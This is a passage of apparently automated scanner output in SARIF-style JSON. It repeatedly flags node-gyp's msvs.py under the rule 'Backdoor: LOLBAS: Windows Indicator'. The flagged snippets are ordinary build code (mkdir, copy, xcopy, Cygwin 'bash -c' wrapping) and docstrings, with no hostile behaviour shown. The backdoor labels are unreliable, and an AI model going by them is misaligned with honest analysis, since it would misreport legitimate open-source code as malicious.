                    "rendered": {
                      "text": "                )\n            else:\n                fix_dst = _FixPath(cpy[\"destination\"])\n                cmd = (\n                    f'mkdir \"{fix_dst}\" 2>nul & set ERRORLEVEL=0 & '\n                    f'copy /Y \"{_FixPath(src)}\" \"{_FixPath(dst)}\"'\n                )\n",
                      "markdown": "`                )\n            else:\n                fix_dst = _FixPath(cpy[\"destination\"])\n                cmd = (\n                    f'mkdir \"{fix_dst}\" 2>nul & set ERRORLEVEL=0 & '\n                    f'copy /Y \"{_FixPath(src)}\" \"{_FixPath(dst)}\"'\n                )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1781,
                  "startColumn": 15,
                  "endLine": 1781,
                  "endColumn": 20,
                  "snippet": {
                    "text": "                outer_dir = posixpath.split(src_bare)[1]\n                fixed_dst = _FixPath(dst)\n                full_dst = f'\"{fixed_dst}\\\\{outer_dir}\\\\\"'\n                cmd = (\n                    f'mkdir {full_dst} 2>nul & cd \"{_FixPath(base_dir)}\" '\n                    f'&& xcopy /e /f /y \"{outer_dir}\" {full_dst}'\n                )\n",
                    "rendered": {
                      "text": "                outer_dir = posixpath.split(src_bare)[1]\n                fixed_dst = _FixPath(dst)\n                full_dst = f'\"{fixed_dst}\\\\{outer_dir}\\\\\"'\n                cmd = (\n                    f'mkdir {full_dst} 2>nul & cd \"{_FixPath(base_dir)}\" '\n                    f'&& xcopy /e /f /y \"{outer_dir}\" {full_dst}'\n                )\n",
                      "markdown": "`                outer_dir = posixpath.split(src_bare)[1]\n                fixed_dst = _FixPath(dst)\n                full_dst = f'\"{fixed_dst}\\\\{outer_dir}\\\\\"'\n                cmd = (\n                    f'mkdir {full_dst} 2>nul & cd \"{_FixPath(base_dir)}\" '\n                    f'&& xcopy /e /f /y \"{outer_dir}\" {full_dst}'\n                )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1719,
                  "startColumn": 7,
                  "endLine": 1719,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        inputs = a.get(\"inputs\") or [relative_path_of_gyp_file]\n        attached_to = inputs[0]\n        need_setup_env = attached_to not in have_setup_env\n        cmd = _BuildCommandLineForRule(\n            spec, a, has_input_path=False, do_setup_env=need_setup_env\n        )\n        have_setup_env.add(attached_to)\n",
                    "rendered": {
                      "text": "        inputs = a.get(\"inputs\") or [relative_path_of_gyp_file]\n        attached_to = inputs[0]\n        need_setup_env = attached_to not in have_setup_env\n        cmd = _BuildCommandLineForRule(\n            spec, a, has_input_path=False, do_setup_env=need_setup_env\n        )\n        have_setup_env.add(attached_to)\n",
                      "markdown": "`        inputs = a.get(\"inputs\") or [relative_path_of_gyp_file]\n        attached_to = inputs[0]\n        need_setup_env = attached_to not in have_setup_env\n        cmd = _BuildCommandLineForRule(\n            spec, a, has_input_path=False, do_setup_env=need_setup_env\n        )\n        have_setup_env.add(attached_to)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1326,
                  "startColumn": 60,
                  "endLine": 1326,
                  "endColumn": 69,
                  "snippet": {
                    "text": "  Arguments:\n    spec: The target dictionary containing the properties of the target.\n  Returns:\n    A triple of (file path, name of the vc tool, name of the msbuild tool)\n  \"\"\"\n    # Select a name for the output file.\n    out_file = \"\"\n",
                    "rendered": {
                      "text": "  Arguments:\n    spec: The target dictionary containing the properties of the target.\n  Returns:\n    A triple of (file path, name of the vc tool, name of the msbuild tool)\n  \"\"\"\n    # Select a name for the output file.\n    out_file = \"\"\n",
                      "markdown": "`  Arguments:\n    spec: The target dictionary containing the properties of the target.\n  Returns:\n    A triple of (file path, name of the vc tool, name of the msbuild tool)\n  \"\"\"\n    # Select a name for the output file.\n    out_file = \"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 825,
                  "startColumn": 31,
                  "endLine": 825,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        return 2 * match.group(1) + '\"' + match.group(2) + '\"'\n\n    segments = s.split('\"')\n    # The unquoted segments are at the even-numbered indices.\n    for i in range(0, len(segments), 2):\n        segments[i] = delimiters_replacer_regex.sub(_Replace, segments[i])\n    # Concatenate back into a single string\n",
                    "rendered": {
                      "text": "        return 2 * match.group(1) + '\"' + match.group(2) + '\"'\n\n    segments = s.split('\"')\n    # The unquoted segments are at the even-numbered indices.\n    for i in range(0, len(segments), 2):\n        segments[i] = delimiters_replacer_regex.sub(_Replace, segments[i])\n    # Concatenate back into a single string\n",
                      "markdown": "`        return 2 * match.group(1) + '\"' + match.group(2) + '\"'\n\n    segments = s.split('\"')\n    # The unquoted segments are at the even-numbered indices.\n    for i in range(0, len(segments), 2):\n        segments[i] = delimiters_replacer_regex.sub(_Replace, segments[i])\n    # Concatenate back into a single string\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 730,
                  "startColumn": 3,
                  "endLine": 730,
                  "endColumn": 8,
                  "snippet": {
                    "text": "        \"-f\",\n        filename,\n    ]\n    cmd = _BuildCommandLineForRuleRaw(spec, cmd, True, False, True, True)\n    # Insert makefile as 0'th input, so it gets the action attached there,\n    # as this is easier to understand from in the IDE.\n    all_inputs = list(all_inputs)\n",
                    "rendered": {
                      "text": "        \"-f\",\n        filename,\n    ]\n    cmd = _BuildCommandLineForRuleRaw(spec, cmd, True, False, True, True)\n    # Insert makefile as 0'th input, so it gets the action attached there,\n    # as this is easier to understand from in the IDE.\n    all_inputs = list(all_inputs)\n",
                      "markdown": "`        \"-f\",\n        filename,\n    ]\n    cmd = _BuildCommandLineForRuleRaw(spec, cmd, True, False, True, True)\n    # Insert makefile as 0'th input, so it gets the action attached there,\n    # as this is easier to understand from in the IDE.\n    all_inputs = list(all_inputs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 721,
                  "startColumn": 3,
                  "endLine": 721,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    # Add makefile to list of sources.\n    sources.add(filename)\n    # Add a build action to call makefile.\n    cmd = [\n        \"make\",\n        \"OutDir=$(OutDir)\",\n        \"IntDir=$(IntDir)\",\n",
                    "rendered": {
                      "text": "    # Add makefile to list of sources.\n    sources.add(filename)\n    # Add a build action to call makefile.\n    cmd = [\n        \"make\",\n        \"OutDir=$(OutDir)\",\n        \"IntDir=$(IntDir)\",\n",
                      "markdown": "`    # Add makefile to list of sources.\n    sources.add(filename)\n    # Add a build action to call makefile.\n    cmd = [\n        \"make\",\n        \"OutDir=$(OutDir)\",\n        \"IntDir=$(IntDir)\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 711,
                  "startColumn": 11,
                  "endLine": 711,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n            mk_file.write(\"{}: {}\\n\".format(\" \".join(outputs), \" \".join(inputs)))\n            mk_file.write(\"\\t%s\\n\\n\" % cmd)\n",
                    "rendered": {
                      "text": "            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n            mk_file.write(\"{}: {}\\n\".format(\" \".join(outputs), \" \".join(inputs)))\n            mk_file.write(\"\\t%s\\n\\n\" % cmd)\n",
                      "markdown": "`            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n            mk_file.write(\"{}: {}\\n\".format(\" \".join(outputs), \" \".join(inputs)))\n            mk_file.write(\"\\t%s\\n\\n\" % cmd)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 710,
                  "startColumn": 11,
                  "endLine": 710,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            outputs = [_Cygwinify(i) for i in outputs]\n            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n            mk_file.write(\"{}: {}\\n\".format(\" \".join(outputs), \" \".join(inputs)))\n",
                    "rendered": {
                      "text": "            outputs = [_Cygwinify(i) for i in outputs]\n            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n            mk_file.write(\"{}: {}\\n\".format(\" \".join(outputs), \" \".join(inputs)))\n",
                      "markdown": "`            outputs = [_Cygwinify(i) for i in outputs]\n            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n            mk_file.write(\"{}: {}\\n\".format(\" \".join(outputs), \" \".join(inputs)))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 709,
                  "startColumn": 11,
                  "endLine": 709,
                  "endColumn": 16,
                  "snippet": {
                    "text": "            inputs = [_Cygwinify(i) for i in inputs]\n            outputs = [_Cygwinify(i) for i in outputs]\n            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n",
                    "rendered": {
                      "text": "            inputs = [_Cygwinify(i) for i in inputs]\n            outputs = [_Cygwinify(i) for i in outputs]\n            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n",
                      "markdown": "`            inputs = [_Cygwinify(i) for i in inputs]\n            outputs = [_Cygwinify(i) for i in outputs]\n            # Prepare the command line for this rule.\n            cmd = [_RuleExpandPath(c, tf) for c in rule[\"action\"]]\n            cmd = ['\"%s\"' % i for i in cmd]\n            cmd = \" \".join(cmd)\n            # Add it to the makefile.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 637,
                  "startColumn": 7,
                  "endLine": 637,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n            name=rule_name,\n            description=r.get(\"message\", rule_name),\n",
                    "rendered": {
                      "text": "        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n            name=rule_name,\n            description=r.get(\"message\", rule_name),\n",
                      "markdown": "`        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n            name=rule_name,\n            description=r.get(\"message\", rule_name),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 564,
                  "startColumn": 26,
                  "endLine": 565,
                  "snippet": {
                    "text": "    \"\"\"Given the input file to which a rule applied, string substitute a path.\n\n  Arguments:\n    path: a path to string expand\n    input_file: the file to which the rule applied.\n  Returns:\n    The string substituted path.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    \"\"\"Given the input file to which a rule applied, string substitute a path.\n\n  Arguments:\n    path: a path to string expand\n    input_file: the file to which the rule applied.\n  Returns:\n    The string substituted path.\n  \"\"\"\n",
                      "markdown": "`    \"\"\"Given the input file to which a rule applied, string substitute a path.\n\n  Arguments:\n    path: a path to string expand\n    input_file: the file to which the rule applied.\n  Returns:\n    The string substituted path.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 496,
                  "startColumn": 57,
                  "endLine": 497,
                  "snippet": {
                    "text": "\n\ndef _AddCustomBuildToolForMSVS(\n    p, spec, primary_input, inputs, outputs, description, cmd\n):\n    \"\"\"Add a custom build tool to execute something.\n\n  Arguments:\n",
                    "rendered": {
                      "text": "\n\ndef _AddCustomBuildToolForMSVS(\n    p, spec, primary_input, inputs, outputs, description, cmd\n):\n    \"\"\"Add a custom build tool to execute something.\n\n  Arguments:\n",
                      "markdown": "`\n\ndef _AddCustomBuildToolForMSVS(\n    p, spec, primary_input, inputs, outputs, description, cmd\n):\n    \"\"\"Add a custom build tool to execute something.\n\n  Arguments:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 474,
                  "startColumn": 25,
                  "endLine": 474,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    description: description of the action\n    command: command line to execute\n  \"\"\"\n    # Require there to be at least one input (call sites will ensure this).\n    assert inputs\n\n    action = {\n",
                    "rendered": {
                      "text": "    description: description of the action\n    command: command line to execute\n  \"\"\"\n    # Require there to be at least one input (call sites will ensure this).\n    assert inputs\n\n    action = {\n",
                      "markdown": "`    description: description of the action\n    command: command line to execute\n  \"\"\"\n    # Require there to be at least one input (call sites will ensure this).\n    assert inputs\n\n    action = {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 38,
                  "endLine": 435,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        arguments = [i.replace(\"$(InputDir)\", \"%INPUTDIR%\") for i in arguments]\n        arguments = [MSVSSettings.FixVCMacroSlashes(i) for i in arguments]\n        if quote_cmd:\n            # Support a mode for using cmd directly.\n            # Convert any paths to native form (first element is used directly).\n            # TODO(quote):  regularize quoting path names throughout the module\n            command[1] = '\"%s\"' % command[1]\n",
                    "rendered": {
                      "text": "        arguments = [i.replace(\"$(InputDir)\", \"%INPUTDIR%\") for i in arguments]\n        arguments = [MSVSSettings.FixVCMacroSlashes(i) for i in arguments]\n        if quote_cmd:\n            # Support a mode for using cmd directly.\n            # Convert any paths to native form (first element is used directly).\n            # TODO(quote):  regularize quoting path names throughout the module\n            command[1] = '\"%s\"' % command[1]\n",
                      "markdown": "`        arguments = [i.replace(\"$(InputDir)\", \"%INPUTDIR%\") for i in arguments]\n        arguments = [MSVSSettings.FixVCMacroSlashes(i) for i in arguments]\n        if quote_cmd:\n            # Support a mode for using cmd directly.\n            # Convert any paths to native form (first element is used directly).\n            # TODO(quote):  regularize quoting path names throughout the module\n            command[1] = '\"%s\"' % command[1]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 412,
                  "startColumn": 35,
                  "endLine": 413,
                  "snippet": {
                    "text": "            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n        command = [\"type\"] if cmd[0] == \"cat\" else [cmd[0].replace(\"/\", \"\\\\\")]\n        # Add call before command to ensure that commands can be tied together one\n",
                    "rendered": {
                      "text": "            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n        command = [\"type\"] if cmd[0] == \"cat\" else [cmd[0].replace(\"/\", \"\\\\\")]\n        # Add call before command to ensure that commands can be tied together one\n",
                      "markdown": "`            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n        command = [\"type\"] if cmd[0] == \"cat\" else [cmd[0].replace(\"/\", \"\\\\\")]\n        # Add call before command to ensure that commands can be tied together one\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 411,
                  "startColumn": 13,
                  "endLine": 411,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n",
                    "rendered": {
                      "text": "        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n",
                      "markdown": "`        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 411,
                  "startColumn": 7,
                  "endLine": 411,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n",
                    "rendered": {
                      "text": "        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n",
                      "markdown": "`        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 410,
                  "startColumn": 7,
                  "endLine": 410,
                  "endColumn": 12,
                  "snippet": {
                    "text": "            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n",
                    "rendered": {
                      "text": "            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n",
                      "markdown": "`            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 409,
                  "startColumn": 11,
                  "endLine": 409,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n",
                    "rendered": {
                      "text": "        if direct_cmd.find(\"OUTDIR\") >= 0:\n            cmd += \"set OUTDIR=$(OutDir)&& \"\n        if has_input_path and direct_cmd.find(\"INPUTPATH\") >= 0:\n            cmd += \"set INPUTPATH=$(InputPath) && \"\n        cmd += 'bash -c \"%(cmd)s\"'\n        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n",
